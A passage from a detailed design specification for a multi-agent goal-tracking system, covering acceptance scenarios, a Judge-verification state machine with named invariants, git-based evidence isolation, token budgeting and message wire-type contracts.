**Why this priority**: The git layer is what lets the idle/plan Judge judge real diffs (Blocker-3/4). Spike GO (§6.1), so it ships on go-git while keeping the degraded ladder.

**Independent Test**: Run two concurrent members; assert each boundary commit adds only its member's write-set, an out-of-write-set change surfaces as contention, a read-only `git log` succeeds, a `git commit --amend` is denied, and a tampered HEAD → "evidence integrity lost".

**Acceptance Scenarios**:
1. **Given** two concurrent members, **When** member A's boundary commit fires, **Then** it adds only A's declared write-set; B's half-written files surface as contention, never swallowed (G-15, CRIT-2 fix).
2. **Given** a worker, **When** it runs `git log/blame/show/diff`, **Then** it succeeds; **When** it runs `git commit/amend/rebase/rm` (tool surface) OR touches `.git/` via bash, **Then** it is denied (D17 + sandbox block).
3. **Given** a diverged HEAD, **When** the engine checks at commit time, **Then** it surfaces "evidence integrity lost" and the Judge fails closed on that diff channel.
4. **Given** a runtime with no boundary commit (size-guard skip / nested-repo / subdir-only), **When** Play resumes a member, **Then** it falls back to a fresh attempt and the Judge is told "rung-1 diffs unavailable" (R§8.4, MIN-6).
5. **Given** an auto-commit path, **When** a secret is written then deleted, **Then** the sensitive-value registry scan catches it and the documented purge/gc applies (MIN-5).

---

### User Story 11 — Plan-lint write-set disjointness + isolation ladder (Priority: P0)

`create_plan` carries `write_sets` + `rationale`; plan-lint REJECTS at approve any two parallel streams with overlapping write paths and any join point without an authored merge/assemble member; a conflict at merge surfaces as a plan-correction event.

**Why this priority**: Two parallel members writing the same file is silent last-write-wins today (concurrency exists NOW with no partitioning). The lint makes disjointness an enforced invariant, not luck.

**Independent Test**: Submit a plan with overlapping parallel write-sets; assert rejection at approve. Submit disjoint write-sets with an authored join member; assert approval.

**Acceptance Scenarios**:
1. **Given** two parallel streams with overlapping write-sets, **When** approve runs, **Then** plan-lint rejects with the overlap named (G-16).
2. **Given** parallel streams with no authored join member at a convergence point, **When** approve runs, **Then** plan-lint rejects (join-less plan).
3. **Given** an exploratory member (unknowable write-set), **When** planned, **Then** it declares no write-set and runs in its own isolated checkout at the highest available isolation rung (system-git worktree → go-git clone → subdir per FR-154); a genuine same-file conflict at merge surfaces as a plan-correction event (D10).
4. **Given** a shard+assemble topology, **When** run, **Then** streams write disjoint shards and ONE assemble member builds the artifact, which is a first-class member with its own criteria (g5).

---

### User Story 12 — Judge evidence feed + blocked-check honesty (Priority: P0)

The Judge fires per the verifier-trigger table (deterministic rungs first, AND-combine); a machine check that could not run returns "unable to verify" and is re-run — NEVER scored as absent evidence; the idle/plan Judge reads real write-set-scoped diffs.

**Why this priority**: Fail-closed must mean "closed on genuinely missing evidence", not "closed on un-observable evidence" (the blocked-check fix, G-3).

**Independent Test**: Deny a machine check via sandbox; assert the Judge returns "unable to verify" and re-runs, never marking the criterion unmet-for-absent-evidence.

**Acceptance Scenarios**:
1. **Given** a machine check the sandbox denied, **When** the Judge evaluates, **Then** it returns "unable to verify" and re-runs safely; it is not scored as absent evidence (G-3, blocked-check fix).
2. **Given** compiled machine checks, **When** they run, **Then** they execute under the agent's OWN tool policy + kernel sandbox — never a privileged bypass (MAJ-13, Constraint #6).
3. **Given** an idle settlement, **When** the Judge runs, **Then** it reads persisted evidence (artifacts, write-set-scoped diffs, latest checkpoint), not a transcript tail alone.

---

### User Story 13 — App-level OVERALL token budget (Priority: P1)

One app-level overall token budget (no money caps, no per-plan budgets, no core-agent exemption) debits owner + member + verifier + Judge turns from provider-reported usage; exhaustion brakes every running scope to `failed(budget_exhausted)` with graceful wind-down.

**Why this priority**: Converts SEC-26's USD cap → tokens (D12); cost isn't reliably measurable so tokens are the honest proxy. A deliberate cost-posture shift removing the privileged exemption.

**Independent Test**: Set a low overall budget; run a plan; assert every scope (including a core-agent turn) debits, and exhaustion brakes every running scope to `failed(budget_exhausted)` at a boundary.

**Acceptance Scenarios**:
1. **Given** a set overall token budget, **When** owner/member/verifier/Judge turns run, **Then** each debits provider usage regardless of `IsPrivilegedAgent`; concurrent debits are atomic (one pool, one lock) (G-14, R§8.3d).
2. **Given** the pool crosses zero, **When** the current turn finishes, **Then** the scope transitions to `failed(budget_exhausted)` at the next boundary with a handover summary; no new turn/dispatch/adjudication starts (R§8.3c graceful wind-down).
3. **Given** an unset budget on a fresh install, **When** goals run, **Then** they run unbounded and the Usage screen shows a persistent "unbounded — set a budget" advisory (R§8.3a).
4. **Given** the operator sets a budget, **When** they do, **Then** a token≠dollar warning is surfaced (R§8.3b).

---

### User Story 14 — Frontend surfaces FE-1..FE-8 + pill/lifecycle crosswalk (Priority: P1)

The goal pill relocates bottom-right with all 8 pill states per goal-id; plan tiles switch to Graph view; questions render in normal chat (no reply card); plan members show status-only; ActivityPanel grows into an Agent-View session list; the Usage screen carries the token budget; untrusted child text renders safely; goal/DoD confirm is conversational.

**Why this priority**: The pill/lifecycle crosswalk (R§8.10) is a drift guard — the two 8-state enums must map deliberately, not accidentally duplicate.

**Independent Test**: Drive a goal through active→judging→re-planning→done; assert the pill renders each pill-state derived from the durable lifecycle + engine phase overlay, reconstructable from the since-cursor replay.

**Acceptance Scenarios**:
1. **Given** a goal transitioning lifecycle states, **When** the pill renders, **Then** the pill state = f(lifecycle, engine_phase_overlay, plan_phase) per the crosswalk; `judging`/`judge_unavailable` come from ephemeral engine phase signals; `re-planning` comes from the durable persisted `plan_phase` (so it survives restart and reconstructs as `re-planning`, not `waiting_on_user`) (R§8.10, C1).
2. **Given** a session with 2 goals, **When** rendered, **Then** 2 pills + 2 timers appear (FE-1).
3. **Given** an untrusted child message, **When** rendered to a human, **Then** it is plain text / sanctioned markdown, no raw HTML, links non-clickable, untrusted-origin chrome visible (FE-7, MAJ-12).
4. **Given** a plan tile click, **When** clicked, **Then** the Graph view auto-switches; members show status only — no ▶/■/Play (FE-2/FE-4, D7).

---

### User Story 15 — Operability: config schema, kill switch, retention (Priority: P1)

One `session_messaging` config section (21 keys, enumerated in FR-195) with documented defaults + reload semantics; a global kill switch neuters messaging live without a rebuild; retention is explicit for message/audit/undelivered horizons.

**Why this priority**: A misbehaving rollout must be neutered without a rebuild (DoD-10); nothing may grow unbounded by omission.

**Independent Test**: Set `session_messaging.enabled=false` live; assert messaging is neutered without restart. Assert every numeric tunable maps to a key (no magic constants).

**Acceptance Scenarios**:
1. **Given** `session_messaging.enabled=false`, **When** set live, **Then** all messaging is neutered without a rebuild (live reload).
2. **Given** the config, **When** inspected, **Then** every numeric tunable (rates, bodies, ceilings, TTLs, quiet window) maps to a key with the documented default.
3. **Given** retention, **When** inspected, **Then** message store inherits 90-day session retention, audit inherits the audit-subsystem policy, and the 7-day undelivered window is a separate horizon — all three named.

---

### User Story 16 — S4 owner↔Judge↔messaging↔engine interlock state machine (Priority: P0)

The verdict-lands / awaiting-owner-correction / concurrent-steer / boot-sweep / transactional-tail-append interactions are ONE specified state machine with named invariants.

**Why this priority**: S4 is the highest-risk seam — it composes four subsystems; unspecified ordering/atomicity is where the system corrupts (N-8).

**Independent Test**: Exercise each invariant INV-1..INV-9 in isolation (verdict during concurrent steer; crash mid-append; boot sweep during awaiting-owner-correction) and assert the invariant holds.

**Acceptance Scenarios**:
1. **Given** a verdict landing while a steer is concurrently enqueued, **When** both fire, **Then** the interlock serializes them per INV-3 (no lost/duplicated verdict).
2. **Given** a crash mid tail-append, **When** the engine restarts, **Then** the DAG is the exact pre-append shape (INV-6, N-8 transactional).
3. **Given** the boot sweep runs during `awaiting-owner-correction`, **When** it reconciles, **Then** it does not re-arm a spurious re-judge of unchanged state (INV-7).

---

### User Story 17 — F2 round-burn standalone fix (Priority: P0, ships immediately)

The live shipped defect — an all-terminal-but-unmet plan re-judges unchanged state every ~30 s idle tick, burning a JudgeRound each time — is fixed by the awaiting-owner-correction gate, with a regression test that fails pre-fix.

**Why this priority**: A live defect independent of the redesign; the ONLY piece that ships ahead of the integrated landing (§4.7). (Already landed at `02171db1` via `lastUnmetTerminalSignature`; this US specifies its acceptance so the integrated system preserves it.)

**Independent Test**: On an all-terminal-but-unmet plan, tick the engine N times; assert exactly one round is consumed. The test must fail if `lastUnmetTerminalSignature` is removed.

**Acceptance Scenarios**:
1. **Given** an all-terminal-but-unmet plan, **When** the idle engine ticks N times on unchanged state, **Then** exactly one JudgeRound is consumed and no verdict is recomputed against unchanged state (G-9).

---

## Behavioral Contract

Primary flows:
- When a worker turn ends with `[goal:evidence]` + `GOAL_STATUS: met`, the system invokes the Judge exactly once (met→done, unmet→one round + steer).
- When all idle conditions hold and the quiet window elapses, the system fires exactly one adjudication, consumes one round, and re-arms only on new activity.
- When a worker turn ends with `GOAL_STATUS: waiting_on_user`, the system pauses with no verdict and no round, suppressing idle settlement until reply.
- When `/goal set` runs, the system compiles criteria, feasibility-gates them, echoes literal commands, and activates only on chat confirmation.
- When a plan reaches all-terminal-but-unmet, the system consumes one round then holds in `awaiting-owner-correction` until the owner appends or a budget is spent.
- When a child calls `message_parent(question)`, the system routes it to the parent; a `self_ok` question may be answered, an `owner_required` question must escalate to the owner terminus.
- When the gateway restarts mid-run, the system sweeps non-terminal sessions to `failed(interrupted)` within N s and recovers the plan.
- When any scope debits the overall token pool to zero, the system finishes the current turn then brakes every running scope to `failed(budget_exhausted)`.

Error flows:
- When a compiled criterion references an out-of-policy tool/credential OR is semantically unjudgeable, the system rejects it at compile — no criterion persists.
- When the compile gate mis-accepts and the runtime Judge's verifier turn RAN but formed no judgment, the system resolves the criterion unmet and escalates once (`criterion_unjudgeable`); the owner then re-states the goal (a diffed amendment) or `/goal clear`s, and absent owner action the goal honestly terminates `failed(judge_rounds_exhausted)` — the escalation surfaces the problem, it does not itself stop round consumption.
- When a machine check is sandbox-denied, the system returns "unable to verify" and re-runs — never scores absent evidence.
- When a child exceeds its per-child unacked ceiling, the system fails the send back to the child as a tool error — never a silent drop.
- When two parallel streams declare overlapping write-sets, the system rejects the plan at approve.
- When a boundary commit's HEAD has diverged, the system surfaces "evidence integrity lost" and the Judge fails closed on that channel.

Boundary conditions:
- When a session carries multiple goals, the system runs one independent settlement/pill/timer/round-budget per goal-id, each a global-cap slot.
- When `isNeedsInputReconstructable` is false at boot, the system sweeps the parked session identically to `running`.
- When the runtime lacks worktree/clone rungs, the system degrades isolation to subdir and Play to fresh-attempt, signalled.
- When the overall token budget is unset, the system runs unbounded with a persistent advisory.

---

## Edge Cases

- **Idle timer race with a verifier turn**: the verifier's own turn counts as activity and re-arms the timer, so a running adjudication never races a second idle verdict against itself (architect F5). Expected: exactly one verdict.
- **Idle settlement vs FR-045 no-signal penalty on the same silence**: for a goal-bearing session, idle settlement takes precedence — it adjudicates accumulated evidence rather than penalizing the quiet turn (architect F5). Expected: no double-penalty.
- **Plan owner idleness vs plan all-terminal**: the plan owner is excluded from the task-level idle trigger so owner-idleness and all-terminal never both fire a DoD adjudication (double-verdict) (N-3/N-11). Expected: one verdict per goal-bearing scope.
- **Delegate child idle**: delegate children are NOT goal-bearing — they hand back to their owner and are never independently adjudicated (N-3). Expected: no child verdict.
- **Out-of-order `respond`**: answering a question by `correlation_id` out of order is safe (V-3/M-3). Expected: correct correlation.
- **Stray `GOAL_STATUS: met` after `/goal clear`**: claim adjudication is gated on an active goal, so a stray claim after clear does nothing (N-12). Expected: no-op.
- **Frozen member as a dependency**: a tail member may `blocked_by` only `done` outcomes, never a frozen member's missing one; if the DoD is unreachable without a frozen outcome, the owner takes the honest-exit path (MAJ-2). Expected: no livelock.
- **Sync-delegate `wait=true` question**: rejected with a clear tool error by default; human-route only via explicit launch-flag opt-in with a bounded wait (P2M-14/MIN-3). Expected: never a silent deadlock.
- **Nested user repo in `work/`**: the user-initialized repo wins, ours skips; the planner is told isolation options are reduced, the Judge told rung-1 diffs unavailable, the owner gets a one-time notice (MIN-6). Expected: degraded contract, signalled.
- **Content-egress through the parent inbox**: a message crossing an agent/channel boundary passes the same content-egress policy the agent's outputs obey; a child cannot exfiltrate through the parent's inbox what it could not send directly (N-10). Expected: policy applied.
- **Board task ↔ session 1:N**: a board task aggregates over N sessions; status is "failed if any required session failed" (O-1). Expected: correct aggregate.
- **Global-cap slot accounting for tasks vs plan members**: a standalone task is goal-bearing → it consumes ONE cap slot; a running plan consumes ONE slot and its MEMBERS are NOT separately counted (they run under the plan's slot); delegate children are never counted (m3/R§8.11). Expected: cap = active chat goals + running plans + standalone tasks + enabled loops, and a plan with 20 members still occupies exactly one slot.

---

## Explicit Non-Behaviors

- The system must NOT adjudicate a chat goal after every completed worker turn, because that is the ADR-052 defect this ADR supersedes (blind/over-eager judging).
- The system must NOT re-judge an all-terminal-but-unmet plan on an unchanged state, because it burns a JudgeRound for no new evidence (F2 live bug).
- The system must NOT infer waiting-on-user from free-text (a prose classifier), because two engineers build two false-positive profiles — only the typed `GOAL_STATUS: waiting_on_user` marker counts.
- The system must NOT reintroduce a runtime `criterion_unverifiable` verdict class or mutate an immutable criterion, because D9 makes the compile-time gate the sole filter (fallback is fail-closed-to-unmet + escalate-once, R§8.1).
- The system must NOT let a parent `respond` to an `owner_required` question, because a parent could hallucinate an answer it should escalate (R§8.2).
- The system must NOT trust the child-authored `authority` tag to downgrade a question below the runtime's own content-derived determination, because the child LLM is untrusted (fail-closed default `owner_required`, runtime upgrade on credential/spend/irreversible/out-of-scope — M3).
- The system must NOT add a 9th S2 session-lifecycle state for awaiting-owner-correction, because it is a durable PLAN condition (`plan_phase` + persisted signature); the plan-owner session is durable `paused` (C1).
- The system must NOT claim the `criterion_unjudgeable` escalate-once prevents round-burn-to-exhaustion, because it only surfaces the problem; the honest terminal absent owner remediation is `failed(judge_rounds_exhausted)` (M2).
- The system must NOT run compiled machine checks under a privileged bypass, because they must execute under the agent's own tool policy + kernel sandbox (MAJ-13, Constraint #6).
- The system must NOT expose per-member start/cancel/resume on plan members, because a per-member cancel with dependents bricks the plan (D7); only standalone tasks carry controls.
- The system must NOT advertise `question`/`needs_input`/warm-resume to 3P children, because external CLIs cannot deliver them (D5).
- The system must NOT silently drop a `question`/`blocker` message, because back-pressure fails to the child as a tool error (no-silent-drop).
- The system must NOT honor `IsPrivilegedAgent` for the token budget, because D12 removes the core-agent exemption deliberately.
- The system must NOT add a hidden allow/deny/ask tool-policy fallback for the new delegate actions or `message_parent`, because Constraint #6 requires explicit seeded policy for every builtin tool.
- The system must NOT hand-write cross-boundary wire types, because Constraint #8 requires generated types from `contracts/*.yaml` (SessionMessage inline-`oneOf` per ADR-034).
- The system must NOT build a second goal store, messaging envelope, claim-marker parser, or budget path, because the shared spine is build-once (DoD-11 anti-drift).

---

## Integration Boundaries

### go-git (embedded, NEW dependency — spike GO)

- **Data in**: `work/` file changes at task/attempt boundaries; write-set path lists.
- **Data out**: per-attempt write-set-scoped diffs (rung-1 evidence); `log/blame/show/diff` reads.
- **Contract**: pure-Go, no cgo (Constraints #1/#2); Apache-2.0 → a NEW `NOTICE` file (one dep, `skeema/knownhosts`, requires verbatim reproduction); `+3.04 MiB` stripped (Constraint #3 holds).
- **On failure / degraded**: no `worktree add`, ff-only merge → isolation ladder degrades system-git worktree → go-git clone → subdir; no boundary commit → Play falls back to fresh attempt; Judge told "rung-1 diffs unavailable".
- **Development**: real go-git (spike GO); the subdir-degraded rung is exercised via a runtime-capability shim in tests.

### MessageBus (`pkg/bus`, existing, in-process)

- **Data in / out**: typed `SessionMessage` frames (child↔parent, session→UI); per-type size/rate caps.
- **Contract**: in-process only; no new transport; messages never cross workspace boundaries.
- **On failure**: never-silent-drop back-pressure → tool error to the child; at-least-once into the inbox, runtime dedupes by `message_id`.
- **Development**: real bus; caps exercised with a fake clock.

### Verifier / Judge (existing real agent, own session)

- **Data in**: criteria + persisted evidence (diffs, artifacts, checkpoints).
- **Data out**: per-criterion verdicts (met/unmet/unable-to-verify).
- **Contract**: 20k window, scoped `inspect_session`, AND-combine ladder; runs under its own tool policy + sandbox.
- **On failure**: Judge rate-limited/down → pill `judge_unavailable`, no round increment while unavailable.
- **Development**: real verifier for e2e; deterministic-rung stubs for unit tests of AND-combine.

### Provider token accounting (existing Usage screen)

- **Data in**: provider-reported per-turn token usage.
- **Data out**: consumed/remaining/exhausted + per-scope spend (owner/member/verifier/Judge).
- **Contract**: one atomic debit path; persisted counter reconciled at boot.
- **On failure**: unset budget → unbounded + advisory; exhaustion → graceful wind-down brake.
- **Development**: real accounting; boundary values exercised with a low seeded budget.

---

## The S4 Interlock State Machine (R§8.8 — dedicated resolution)

S4 composes the owner loop, the Judge, the typed messaging plane, and the deterministic plan engine into ONE state machine. It governs a **goal-bearing scope** (chat goal, standalone task, or plan owner). The durable state is the **8-state** S2 session-lifecycle enum (`queued/running/needs_input/paused/completed/failed/cancelled/timed_out`) — it is NOT inflated for awaiting-owner-correction. Awaiting-owner-correction is a **durable PLAN condition** (`plan_phase=awaiting_owner_correction` + `last_unmet_terminal_signature` on the plan record, C1); while it holds, the plan-owner **session** sits at lifecycle `paused` (owner idle awaiting input). The transitions below are the interlock the four subsystems share; the mermaid nodes are the 8 session states, and the awaiting-correction plan condition is shown as the reason the owner session parks at `paused`.

### State diagram

```mermaid
stateDiagram-v2
    [*] --> queued: admitted to cap
    queued --> running: dispatched (turn starts)
    running --> needs_input: question(wait=true) / GOAL_STATUS: waiting_on_user
    needs_input --> running: respond by correlation_id (warm) [INV-4]
    running --> running: idle settlement OR claim -> Judge (one adjudication) [INV-1]
    running --> paused: all-terminal & DoD unmet -> plan enters awaiting_owner_correction; owner session idles [INV-2]
    paused --> running: owner appends correction (transactional intent-log) [INV-6]
    paused --> failed: rounds/token budget exhausted [INV-8]
    running --> completed: verdict met (all criteria) [INV-1]
    running --> failed: attempts/rounds/budget exhausted OR honest-exit
    running --> paused: cooperative cancel-soft (grace)
    paused --> cancelled: hard cancel after grace / user Stop
    needs_input --> timed_out: needs_input TTL elapsed -> auto-handback(pause) [INV-5]
    completed --> [*]
    failed --> [*]
    cancelled --> [*]
    timed_out --> [*]
    note right of paused
      paused covers BOTH cancel-soft grace AND
      awaiting_owner_correction. The latter is a
      DURABLE PLAN condition (plan_phase +
      persisted last_unmet_terminal_signature),
      NOT a session state. F2 gate: engine does
      NOT re-judge unchanged all-terminal state;
      boot sweep EXEMPTS an awaiting_owner_correction
      owner session from failed(interrupted) [INV-7/INV-9].
    end note
    running --> failed: boot sweep (no live turn) -> failed(interrupted) [INV-9]
    needs_input --> failed: boot sweep & !reconstructable [INV-9]
    paused --> failed: boot sweep (no live turn) -> failed(interrupted) UNLESS awaiting_owner_correction (exempt) [INV-9]
```

### Named invariants (spec these as tested assertions)

- **INV-1 (single verdict per adjudication)**: an adjudication (claim OR idle-settled) invokes the Judge **exactly once** and consumes **exactly one round**; the verifier's own turn counts as activity so it cannot race a second verdict against itself. *(G-1/G-2)*
- **INV-2 (all-terminal precondition)**: the plan Judge fires **only** when every member is terminal (`done`/`failed`); it never fires on partial progress or a single member's completion. An all-terminal-but-unmet outcome durably parks the plan at `plan_phase=awaiting_owner_correction` (persisting `last_unmet_terminal_signature`) and the plan-owner session at lifecycle `paused`. *(design verifier-trigger table)*
- **INV-3 (steer/verdict serialization)**: a `steer`/`respond` enqueue and a verdict-land are serialized through the S4 lock; a steer applies at the child's **next tool boundary**, never mid-tool, and never interleaves with an in-flight verdict write. *(M-2)*
- **INV-4 (warm-resume identity)**: a `respond` to a parked `needs_input` session resumes the SAME session generation with retained context (native only) and routes by `correlation_id`; out-of-order answers are safe. *(V-3/M-3)*
- **INV-5 (bounded park)**: a `needs_input` session is never unbounded — TTL (24 h) drives escalation at T1 then auto-`handback(pause)` at TTL. *(G-6/MAJ-4)*
- **INV-6 (transactional tail append via write-ahead intent-log)**: tail members + their edges + the revision entry + the plan-record patch commit **all-or-nothing** via a write-ahead intent-log (M4). A SELF-CONTAINED intent record (full member bodies + edges + revision entry + plan-record patch — not just ids) is written and **marked committed (fsync) BEFORE any per-file write is applied**; the per-file writes (temp+rename) are then applied idempotently and the intent marked done. A Stop/crash before the commit-marker leaves an *uncommitted* intent, which boot discards (delete any partially-written members, do not wire edges) → exact pre-append DAG; a crash after commit but before done leaves a *committed-but-not-done* intent, which boot replays forward idempotently (done-marker makes re-apply a no-op). The engine never dispatches into a half-wired plan. Required because per-file JSONL storage gives only per-file temp+rename atomicity, not multi-file atomicity. *(N-8/G-11)*
- **INV-7 (no re-judge of unchanged state, durable across restart)**: while a plan is `awaiting_owner_correction`, the engine does NOT recompute a verdict against unchanged all-terminal state (keyed by `last_unmet_terminal_signature`, now **persisted on the plan record** so the gate survives restart, C1); it re-judges only after the owner appends a correction (new activity) or a budget is spent. *(F2/G-9)*
- **INV-8 (budget brake at boundary)**: overall token exhaustion transitions every running scope to `failed(budget_exhausted)` at the next turn/adjudication boundary (graceful wind-down), never mid-tool; the debit + exhaustion check are one atomic critical section (the counter is never corrupted, though `consumed` may overshoot the cap by up to the sum of in-flight turn costs — post-turn provider-reported debit). *(R§8.3c/d, G-14)*
- **INV-9 (boot reconciliation)**: at boot, every non-terminal session with no live runtime turn becomes `failed(interrupted)` within N s (or is preserved iff `isNeedsInputReconstructable`); a `session.failed` event fires so idle settlement and plan recovery resume. **Two exemptions** keep INV-7 intact across INV-9: (1) a `paused` plan-owner session whose plan is `awaiting_owner_correction` is NOT swept (legitimately idle, like a reconstructable `needs_input`); (2) the persisted `last_unmet_terminal_signature` means the boot sweep re-dispatches/re-judges ONLY plans whose all-terminal state actually changed or that were mid-turn — it does NOT re-judge an unchanged awaiting-correction plan (so G-13 recovery and G-9 no-re-judge both hold). *(CRIT-1/G-13, interacts with INV-7)*

---

## Contract Surface — field-level shapes for every §6 wire type

> Constraint #8: every type lands in `contracts/*.yaml` in **Phase 0**, generated types only, `make verify-contracts` green. Legend: **[EXTEND]** existing schema (DoD-11 anti-drift — never duplicate) · **[NEW]**.

### SessionMessage — inline `oneOf` + discriminator [NEW, hosted inline in `openapi.yaml`, ADR-034]

Common envelope (every variant): `message_id` (string, dedupe key), `session_id` (string; the durable id, `task_id` deprecated alias on `delegate.status` only), `parent_session_id` (string, nullable), `generation` (int, for `resumed_from` lineage), `direction` (enum `child_to_parent | parent_to_child | session_to_ui | engine` — M8: **`engine`** is the direction for engine/owner-emitted control kinds like `revision_entry`; the unused `human` value is dropped so every one of the 12 `kind` variants maps to a valid direction), `kind` (discriminator), `depth` (int, ≤5 — the message-HOP cap: how many parent↔child hops this message has traversed, m7; schema-validatable. This is DISTINCT from and INDEPENDENT of the configurable delegation-depth backstop `defaultMaxSubTurnDepth` (default 3, `pkg/agent/subturn.go`) which bounds how deep agents may SPAWN — one caps message forwarding, the other caps spawn nesting, m-5), `created_at` (RFC3339), `sender_identity` (string), `untrusted_origin` (bool — drives FE-7 chrome).

Variants by `kind` (enumerated from design §5.1/§5.2):

| `kind` | Direction | Payload fields |
|--------|-----------|----------------|
| `progress` | child→parent | `text` (untrusted), `pct?` (int, 0–100 inclusive) |
| `checkpoint` | child→parent | `summary` (1–3 sentences), `result_so_far?`, `commit_ref?` (git boundary commit) |
| `artifact` | child→parent | `paths[]`, `note?` (untrusted) |
| `blocker` | child→parent | `text`, `severity` (enum `low \| medium \| high`) |
| `question` | child→parent | `text`, `wait` (bool), `correlation_id`, `authority` (enum `self_ok \| owner_required`; **default `owner_required` on omission — fail-closed**; runtime-derived per R§8.2/FR-139, a child tag is never trusted to downgrade) |
| `decision_request` | child→parent | `text`, `options[]` (array of strings — the enumerated choices; the answering `respond.text` names the chosen option), `correlation_id`, `authority` (enum `self_ok \| owner_required`; default `owner_required`; same runtime-derivation) |
| `error` | child→parent | `text`, `fatal` (bool) |
| `handback` | child→parent | `result_so_far`, `artifacts[]`, `open_questions[]`, `mode` (enum `final \| pause`) |
| `revision_entry` | engine | `verb` (enum `append \| supersede \| targeted_retry`), `falsified_assumption`, `tail_adds` (member ids + edges), `superseded_member_id?`, `retried_member_id?`, `reason`, `plan_id`, `generation` |
| `goal_status` | session→UI | `condition` (enum `met \| waiting_on_user`), `goal_id` |
| `steer` | parent→child | `text`, `correlation_id?` |
| `respond` | parent→child | `text`, `correlation_id` (answers a `question`) |

Caps (schema-validated, enforced runtime-side, never silent): child sends 10/min, 32 KiB, message-hop depth ≤5 (the message-forwarding cap, distinct from the spawn-nesting delegation-depth backstop default 3, m-5); steer 6/min, 16 KiB; per-child unacked ceiling 20 open question+blocker (D15); inbox 200 unacked/session; at-least-once + dedupe-by-`message_id`; explicit `inbox_ack`; acked messages persist in the audit log; events (`session.*`/`tool.*`) are un-acked ring-buffered fan-out sharing the envelope, NEVER the ack/ceiling semantics.

### Durable session-lifecycle record — 8-state [NEW; distinct from `Session.status` active/archived/interrupted and from `plan.State` 5-state]

Fields: `session_id`, `generation` (int), `resumed_from` (session_id, nullable), `state` (enum `queued \| running \| needs_input \| paused \| completed \| failed \| cancelled \| timed_out`), `terminal` (derived), `owner_scope` (union: `parent_session_id` | `plan_id` | `human`/chat-principal for top-level, N-9), `owns_plan_id?` (plan_id — the reciprocal of `Plan.owner_session_id`, set when THIS session is a plan's owner session; lets the boot sweep exempt a `paused` awaiting-correction owner whose `owner_scope` is `human`, m-3/FR-147), `goal_ref?` (goal_id), `workspace_id`, `agent_id`, `is_3p` (bool), ~~`launch_profile` (enum `utility \| specialist`)~~ **REMOVED — superseded by ADR-053 Amendment (2026-08-30): `launch_profile` deleted outright, steering is always available**, `last_checkpoint_ref?`, `undelivered_message_ids[]`, `needs_input?` (`{correlation_id, ttl_deadline, reconstructable}` — `reconstructable` is a **park-time HINT only** (m5); the authoritative determination is `isNeedsInputReconstructable(rec)` re-evaluated AT BOOT, never the stored value), `failed_reason?` (e.g. `interrupted`, `budget_exhausted`, `judge_rounds_exhausted`), `created_at`, `updated_at`. Persisted per-entity JSONL (like tasks/pins), 64-shard mutex pool; the immutable-terminal invariant (L-3) holds — `follow_up`/Play mint a new `generation` via `resumed_from` (MAJ-1/N-7).

### Revision entry [NEW; also a SessionMessage `kind` member]

`{revision_id, plan_id, generation, verb (append|supersede|targeted_retry), falsified_assumption, tail_adds (member ids + edges), superseded_member_id?, retried_member_id?, reason, created_at}`. Committed transactionally with the tail members + edges (INV-6/N-8).

### Unified goal / criteria record [NEW wrapper; REUSES `AcceptanceCriterion.yaml` [EXTEND-by-reuse]]

`{goal_id, binding (oneOf session_id | task_id | plan_id), source (enum chat_compiled | task_explicit | plan_dod), prompt, definition, criteria: []AcceptanceCriterion (kind check|behavior|prose — REUSED unchanged, "machine"=check), attempts_max, judge_rounds_max, round (adjudications consumed), state, created_at}`. **One criteria model, two authors** (S1) — never a second goal store.

### `write_sets` + `rationale` on create_plan [NEW fields on `PlanCreateRequest.yaml` [EXTEND]]

Plan-level: `rationale` (string, persisted planning rationale). Per-member: `write_set` ([]string of concrete paths the member creates/edits; empty for exploratory members that take the highest available isolation rung per FR-154 — never assuming go-git `worktree add`), `stream?` (parallel-group id), `is_join` (bool — a join/assemble member with its own criteria). Plan-lint reads `write_set` to reject overlapping parallel streams + join-less convergence at approve.

### Budget / bounds [config + wire]

- Config `token_budget` (int; `0` = unbounded sentinel, R§8.3a; restart-gated) · `attempts_max` (3 native · 6) · `judge_rounds_max` (rounds N) — all restart-gated. Per-record: `attempts` (per member/task), `judge_rounds` on goal/plan records [EXTEND `Plan.yaml` which already carries `judge_rounds`].
- **TokenBudgetStatus** [NEW wire, Usage screen]: `{budget (int, 0=unbounded), consumed, remaining, exhausted (bool), advisory? (string, "unbounded — set a budget"), by_scope {owner, member, verifier, judge}}`.

### Pill-state enum (8) [EXTEND `GoalStatusFrame.yaml` `state` 4→8; the enum values are NEW]

`queued \| active \| waiting_on_user \| judge_unavailable \| re-planning \| judging \| done \| failed`. The frame also gains `goal_id` (per-goal-id, R§8.11) and its `round` description updates to "one round = one adjudication" (R§8.9).

### Lifecycle ↔ pill crosswalk (R§8.10 — the drift guard)

| S2 lifecycle (durable) | D14 pill (display) | Source of the pill state |
|------------------------|--------------------|--------------------------|
| `queued` | `queued` | lifecycle |
| `running` | `active` | lifecycle (default overlay) |
| `running` + verifier-turn-in-flight | `judging` | ephemeral engine phase signal (pill-only) |
| `running` + Judge rate-limited/down | `judge_unavailable` | ephemeral Judge-availability signal (pill-only) |
| `paused` + `plan_phase=awaiting_owner_correction` (durable) | `re-planning` | **durable** plan condition (C1 — survives restart; pill reconstructs correctly after boot) |
| `needs_input` / `paused` (any other reason: cancel-soft grace, etc.) | `waiting_on_user` | lifecycle |
| `completed` | `done` | lifecycle |
| `failed` / `cancelled` / `timed_out` | `failed` | lifecycle (reason distinguishes stopped/timeout) |

Pill state = `f(lifecycle_state, engine_phase_overlay, plan_phase)`. Two pill states are sourced from **ephemeral** engine-phase signals with no lifecycle counterpart (`judging`, `judge_unavailable`); `re-planning` is sourced from the **durable** `plan_phase=awaiting_owner_correction` over a `paused` session (C1), so it too reconstructs correctly after a restart. Durable lifecycle + plan_phase are authority (survive restart, drive dispatch/settlement/`blocked_by`/boot); the pill is display-only, reconstructed from lifecycle + plan_phase + latest engine phase via the since-cursor replay — deliberately separate from the 8-state lifecycle enum, not a duplicate.

### Cancel / restart [request/response, NEW; extends existing plan Stop/restart transitions]

- **Stop** (plan/goal id) → cancel cascade → `cancelled` (owner + members + verifiers, `stopped_by_user`); a cap-queued plan is Stoppable.
- **Play** → `cancelled → approved` edge → mints a new `generation` via `resumed_from`; response `{new_session_id, generation, resumed_from}`; done members preserved, failed/cancelled resume from last git commit (no-commit → fresh attempt), JudgeRounds 0.

### Mid-span subagent frames [EXTEND `SubagentStartFrame.yaml` / `SubagentEndFrame.yaml`]

Add mid-span `subagent_message` / `subagent_state` events between the brackets (state, checkpoint, message, steering-receipt) — ride the existing since-cursor WS replay; feed pill/panel/board live.

### Delegate action set [EXTEND `delegate` tool schema + policy seed]

